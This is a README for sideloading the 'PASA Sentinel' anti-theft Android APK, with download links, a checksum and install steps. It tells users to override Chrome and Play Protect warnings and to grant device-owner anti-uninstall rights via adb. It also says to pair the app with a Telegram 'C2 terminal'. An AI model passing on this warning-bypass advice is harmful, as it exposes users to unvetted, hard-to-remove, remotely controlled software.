# 📦 PASA Sentinel APK Releases

This directory hosts verified release binaries of **PASA Sentinel (Physical Anti-Theft Security Agent)**.

---

## 📥 Direct Downloads

| File | Release | Build | Size | Direct Link |
|---|---|---|---|---|
| **`PASA-Sentinel-v3.1.0.apk`** | `v3.1.0` (Latest Stable) | Build 16 | 18.11 MB | [Download APK](https://github.com/rbr48/pasa/raw/main/releases/PASA-Sentinel-v3.1.0.apk) |
| **`pasa-latest.apk`** | Rolling Latest | Build 16 | 18.11 MB | [Download Latest](https://github.com/rbr48/pasa/raw/main/releases/pasa-latest.apk) |
| **Archive Releases** | `v3.0.0` – `v3.0.9` | Legacy | Various | [GitHub Releases](https://github.com/rbr48/pasa/releases) |

Alternative Mirror (Fast CDN): [https://pasa.izhaanintellect.fun/api/app/download/pasa-latest.apk](https://pasa.izhaanintellect.fun/api/app/download/pasa-latest.apk)

---

## 🔐 Cryptographic Integrity (v3.1.0)

Always verify the SHA-256 checksum before sideloading onto your phone:

* **File:** `PASA-Sentinel-v3.1.0.apk`
* **File Size:** `18,984,359 bytes` (18.11 MB)
* **SHA-256 Checksum:**
  ```text
  87140529c244ae41a41beb2fc04284a88763725d65bd24adb660a80ceb19062a
  ```

### Verify Checksum:
- **Windows (PowerShell):**
  ```powershell
  Get-FileHash PASA-Sentinel-v3.1.0.apk -Algorithm SHA256
  ```
- **Linux / macOS:**
  ```bash
  sha256sum PASA-Sentinel-v3.1.0.apk
  ```

---

## 🚀 Quick Sideload & Installation

1. Transfer or download the APK to your Android device (Android 8.0 through Android 16).
2. If Chrome displays *"File might be harmful"*, tap **Download anyway** (standard for off-market sovereign packages).
3. If Google Play Protect shows a warning, tap **More details** → **Install anyway**.
4. To unlock Knox-grade Device Owner defense (anti-uninstall & lockscreen shade protection), connect via USB and execute:
   ```bash
   adb shell dpm set-device-owner com.izhaanintellect.pasa/.admin.PasaDeviceAdmin
   ```
5. Follow the [Complete Telegram Bot Setup Guide](../README.md#complete-telegram-bot-setup-guide) in the main README to pair your C2 terminal!
